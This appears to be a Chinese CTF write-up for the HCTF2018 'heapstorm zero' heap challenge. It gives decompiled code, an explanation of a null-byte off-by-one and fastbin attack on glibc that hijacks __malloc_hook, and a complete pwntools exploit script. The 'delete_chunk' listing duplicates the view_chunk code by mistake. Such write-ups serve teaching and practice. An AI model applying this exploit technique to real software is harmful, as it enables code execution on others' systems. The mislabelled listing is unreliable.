# HCTF2018 heapstorm zero
## Author: 文火

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>经典的堆题，利用了分配largebin时的malloc_consolidate和fastbin attack，我在这里参考了veritas501官方的方法，利用fastbin分配到top指针上进行利用。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>先是阅读了[Eur3kA队伍的NeO]()大佬写的wp得知scanf的一个小技巧，当输入超长字符串传给scanf时，scanf会分配一个临时堆块来暂存，即使已经用setvbuf关闭了缓冲区，所以这就使得这里的null byte off by one漏洞的利用成为了可能，配合largebin的malloc_consolidate得到unsorted bin并且shrink chunk size来达到chunk overlapping。思路讲完了，接下来看看具体的实现步骤，老样子先放程序逻辑代码：</font></br>

**main**
```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int chooes; // eax
  bool v4; // zf
  bool v5; // sf
  unsigned __int8 v6; // of

  set_envp();
  while ( 1 )
  {
    while ( 1 )
    {
      chooes = menu();
      v6 = __OFSUB__(chooes, 2);
      v4 = chooes == 2;
      v5 = chooes - 2 < 0;
      if ( chooes != 2 )
        break;
LABEL_10:
      view_chunk();
    }
    while ( (unsigned __int8)(v5 ^ v6) | v4 )
    {
      if ( chooes != 1 )
        goto LABEL_11;
      add_chunk();
      chooes = menu();
      v6 = __OFSUB__(chooes, 2);
      v4 = chooes == 2;
      v5 = chooes - 2 < 0;
      if ( chooes == 2 )
        goto LABEL_10;
    }
    if ( chooes == 3 )
    {
      del_chunk();
    }
    else
    {
      if ( chooes == 4 )
      {
        puts("Bye!");
        exit(0);
      }
LABEL_11:
      puts("Invaild choice!");
    }
  }
}
```

**add_chunk**
```C
__int64 add_chunk()
{
  int size; // eax
  __int64 _size; // rbp
  unsigned __int64 chunk; // rbx
  __int64 index; // rdx
  __int64 v4; // rax
  unsigned __int64 v6; // [rsp+8h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  if ( (unsigned int)alloc_times > 0x20 )
  {
LABEL_9:
    puts("Too many chunks!");
    exit(-1);
  }
  _printf_chk(1LL, "Please input chunk size:");
  size = get_num();
  if ( (unsigned int)(size - 1) > 0x37 )
  {
    puts("Invalid size!");
    exit(-1);
  }
  _size = size;
  chunk = (unsigned __int64)calloc(size, 1uLL);
  if ( !chunk )
    goto LABEL_17;
  _printf_chk(1LL, "Please input chunk content:");
  sub_EE0((_BYTE *)chunk, _size);
  index = 0LL;
  v4 = *(_QWORD *)link;
  while ( *(_QWORD *)(link + 8 * index + 8) != v4 )
  {
    if ( ++index == 32 )
      goto LABEL_9;
  }
  ++alloc_times;
  *(_QWORD *)(link + 8LL * (signed int)index + 8) = chunk ^ v4;
  if ( __readfsqword(0x28u) != v6 )
  {
LABEL_17:
    puts("Alloc error!!");
    exit(-1);
  }
  return _printf_chk(1LL, "Chunk index: %d\n");
}
```

**view_chunk**
```C
int view_chunk()
{
  unsigned int index; // eax
  int result; // eax
  unsigned __int64 v2; // rt1
  unsigned __int64 v3; // rt1
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  _printf_chk(1LL, "Please input chunk index:");
  index = get_num();
  if ( index > 0x1F )
  {
    puts("Invalid index!");
    exit(-1);
  }
  if ( *(_QWORD *)link == *(_QWORD *)(link + 8LL * (signed int)index + 8) )
  {
    v3 = __readfsqword(0x28u);
    result = v3 ^ v4;
    if ( v3 == v4 )
      result = puts("No such a chunk!");
  }
  else
  {
    v2 = __readfsqword(0x28u);
    result = v2 ^ v4;
    if ( v2 == v4 )
      result = _printf_chk(1LL, "Content: %s\n");
  }
  return result;
}
```

**delete_chunk**
```C
int view_chunk()
{
  unsigned int index; // eax
  int result; // eax
  unsigned __int64 v2; // rt1
  unsigned __int64 v3; // rt1
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  _printf_chk(1LL, "Please input chunk index:");
  index = get_num();
  if ( index > 0x1F )
  {
    puts("Invalid index!");
    exit(-1);
  }
  if ( *(_QWORD *)link == *(_QWORD *)(link + 8LL * (signed int)index + 8) )
  {
    v3 = __readfsqword(0x28u);
    result = v3 ^ v4;
    if ( v3 == v4 )
      result = puts("No such a chunk!");
  }
  else
  {
    v2 = __readfsqword(0x28u);
    result = v2 ^ v4;
    if ( v2 == v4 )
      result = _printf_chk(1LL, "Content: %s\n");
  }
  return result;
}
```

**input vulnerability**
```C
unsigned __int64 __fastcall sub_EE0(_BYTE *chunk, __int64 size)
{
  _BYTE *chunk_ptr; // rbx
  signed __int64 v3; // rdx
  _BYTE *v4; // rax
  bool v5; // zf
  char buf; // [rsp+7h] [rbp-31h]
  unsigned __int64 v8; // [rsp+8h] [rbp-30h]

  v8 = __readfsqword(0x28u);
  if ( size )
  {
    chunk_ptr = chunk;
    while ( 1 )
    {
      buf = 0;
      if ( read(0, &buf, 1uLL) < 0 )
      {
        puts("Read error!!\n");
        exit(1);
      }
      v4 = chunk_ptr;
      v5 = buf == 10;
      *chunk_ptr = buf;
      if ( v5 )
        break;
      v3 = (signed __int64)&(chunk_ptr++)[1LL - (_QWORD)chunk];
      if ( chunk_ptr == &chunk[size] )
      {
        v4 = &chunk[v3];
        break;
      }
    }
  }
  else
  {
    v4 = chunk;
  }
  *v4 = 0;	//overflow here
  return __readfsqword(0x28u) ^ v8;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>看完了程序流程后可以得到程序**最大只允许分配0x40大小**的堆块，除非利用scanf的largebin来合并fastbin，不然不可能得到unsorted bin，所以我们先分配一系列fastbin并且free之，菜单里输入超长字符串后**fastbin就会被加入small bin**，相邻的fastbins最终会合并为一个大smallbin，因此当我们再次alloc堆块的时候就会从这个大smallbin里面切割堆块，smallbin随后被标识为unsorted bin，**利用null byte off by one来shrink unsorted bin使之后相邻的fastbin无法更新pre_size**，再次free前后fastbin后利用malloc_consolidate来合并堆块最后得到一整个重叠的smallbin。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>用代码来表示如下：</font></br>

```python
from pwn import *

p=process('./heapstorm_zero')
elf=ELF('./libc64.so')
DEBUG=1

one_gadget=0x4526a

if DEBUG:
    context.log_level=True

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
sla=lambda a,x:p.sendlineafter(a,x)
rv=lambda x:p.recvuntil(x)

def add(size,content=''):
    sla('Choice:','1')
    sla('size:',str(size))
    sla('content:',content)
    
def view(index):
    sla('Choice:','2')
    sla('index:',str(index))

def dele(index):
    sla('Choice:','3')
    sla('index: ',str(index))

def scanf_consli():
    sla('Choice:','3'*0x500)

add(0x20)
for i in range(20):
    add(0x30)   # 1-20

dele(0)
for i in range(4,10):
    dele(i)

scanf_consli()

add(0x38,'a'*0x30+p64(0x120))   # 0
add(0x38,'a'*0x30+p32(0x40))    # 4
add(0x38)                       # 5
add(0x38)                       # 6
add(0x28)                       # 7
add(0x28)                       # 8

dele(7)
dele(4)
scanf_consli()
dele(10)
scanf_consli()

add(0x38)   # 4

# 5 fd and main_arena is overlapped
view(5)
rv('Content: ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base is :'+hex(libc_base))

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>重叠了之后leak就很简单了不说了，我在这里创建了**三个重叠堆块**（莽点准没错）。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**1.首先**double free第一组0x40大小的堆块，修改fd，alloc两次后fd被放入**fastY数组，也就是main_arena上**，这里我把fd修改为了0x30（不然再用0x40大小的堆块分配上去会覆盖原来的fd）。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**2.再次**double free第二组0x30大小的堆块，**利用之前放上去的fd绕过size检查把fastbin分配进main_arena**，因为程序允许分配的堆块太小不足以分配到top指针，所以我在堆块的末尾放了个0x40大小，供第三组堆块分配上去。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**3.然后**第三组堆块就可以直接覆盖top指针，**注意堆块由calloc分配会清空块内数据，所以chunk base也要leak一下计算数据输入到第三组堆块里以恢复main_arena的环境防止程序崩溃**，把top指针改到\__malloc_hook上就可以了，下次分配新的fastbin的时候就会被分配到__malloc_hook上，成功getshell。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>我的利用方法非常粗鲁，脚本也不美观，所以凑合着看看哈：</font></br>

**Exploit**
```python
from pwn import *

p=process('./heapstorm_zero')
elf=ELF('./libc64.so')
DEBUG=1

one_gadget=0x4526a

if DEBUG:
    context.log_level=True

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
sla=lambda a,x:p.sendlineafter(a,x)
rv=lambda x:p.recvuntil(x)

def add(size,content=''):
    sla('Choice:','1')
    sla('size:',str(size))
    sla('content:',content)
    
def view(index):
    sla('Choice:','2')
    sla('index:',str(index))

def dele(index):
    sla('Choice:','3')
    sla('index: ',str(index))

def scanf_consli():
    sla('Choice:','3'*0x500)

add(0x20)
for i in range(20):
    add(0x30)   # 1-20

dele(0)
for i in range(4,10):
    dele(i)

scanf_consli()

add(0x38,'a'*0x30+p64(0x120))   # 0
add(0x38,'a'*0x30+p32(0x40))    # 4
add(0x38)                       # 5
add(0x38)                       # 6
add(0x28)                       # 7
add(0x28)                       # 8

# use largebin malloc_consolidate
# to get smallbin
dele(7) # bypass unlink check
dele(4)
scanf_consli()
dele(10)
scanf_consli()

add(0x38)   # 4

# 5 fd and main_arena is overlapped
view(5)
rv('Content: ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base is :'+hex(libc_base))

add(0x38) # 7
add(0x38) # 9
add(0x28) # 10 alloc to the first address
add(0x28) # 21
# 7  and 5 is overlapped
# 9  and 6 is overlapped
# 21 and 8 is overlapped

#==========================
# just to leak chunk base
dele(11)
dele(5)
view(7)
rv('Content: ')
chunk_base=u64(p.recv(6)+2*'\x00')-0x2b0
log.info('chunk base is :'+hex(chunk_base))

add(0x38)
add(0x38)
# recover
#=========================
# use double free to write __malloc_hook
dele(5)
dele(11)
dele(7)

add(0x38,p64(0x30)) # 5
add(0x38)           # 7
add(0x38)           # 8

dele(8)
dele(10)
dele(21)

add(0x28,p64(libc_base+0x3c4b30))
add(0x28)
add(0x28)
add(0x28,p64(0)*3+p64(0x40))

dele(9)
dele(13)
dele(6)

add(0x38,p64(libc_base+0x3c4b50))
add(0x38)
add(0x38)
#add(0x38)
add(0x38,p64(0)*3+p64(libc_base+0x3c4b00)+p64(chunk_base+0x220)*3)

#gdb.attach(p)
add(0x38,p64(libc_base+one_gadget))
add(0x38,p64(libc_base+one_gadget))
add(0x38,p64(libc_base+one_gadget))

sla('Choice:','1')
sla('size:','2')
 
p.interactive()




```